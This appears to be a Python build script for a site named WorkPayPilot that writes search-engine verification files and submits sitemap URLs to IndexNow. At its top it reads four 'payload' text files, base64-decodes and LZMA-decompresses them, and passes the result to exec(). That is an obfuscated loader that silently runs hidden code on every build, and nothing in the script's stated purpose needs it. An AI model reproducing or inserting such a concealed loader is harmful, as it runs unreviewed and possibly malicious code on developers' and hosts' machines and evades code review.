import os,lzma,base64,json,re,urllib.request
from pathlib import Path
base=Path(__file__).parent
payload=''.join((base/f'payload{i}.txt').read_text().strip() for i in range(1,5))
exec(lzma.decompress(base64.b64decode(payload)).decode())

indexnow_key='4e8d91b7c2a64f309b5e7d1c8a2f6b40'
public=Path('public')
(public/f'{indexnow_key}.txt').write_text(indexnow_key,encoding='utf-8')

google_verify='google4e5982359b548ca3.html'
(public/google_verify).write_text('google-site-verification: '+google_verify,encoding='utf-8')

# Best-effort IndexNow submission. Never fail the site build if the endpoint is unavailable.
try:
    site_url=os.environ.get('SITE_URL','https://workpaypilot.onrender.com').rstrip('/')
    sitemap=(public/'sitemap.xml').read_text(encoding='utf-8')
    urls=re.findall(r'<loc>(.*?)</loc>',sitemap)
    payload_json=json.dumps({
        'host': site_url.replace('https://','').replace('http://','').split('/')[0],
        'key': indexnow_key,
        'keyLocation': f'{site_url}/{indexnow_key}.txt',
        'urlList': urls[:10000]
    }).encode('utf-8')
    req=urllib.request.Request(
        'https://api.indexnow.org/indexnow',
        data=payload_json,
        headers={'Content-Type':'application/json; charset=utf-8','User-Agent':'WorkPayPilot/1.0'},
        method='POST'
    )
    with urllib.request.urlopen(req,timeout=12) as resp:
        print('IndexNow submission:',resp.status,'URLs:',len(urls))
except Exception as exc:
    print('IndexNow submission skipped:',type(exc).__name__,str(exc)[:160])
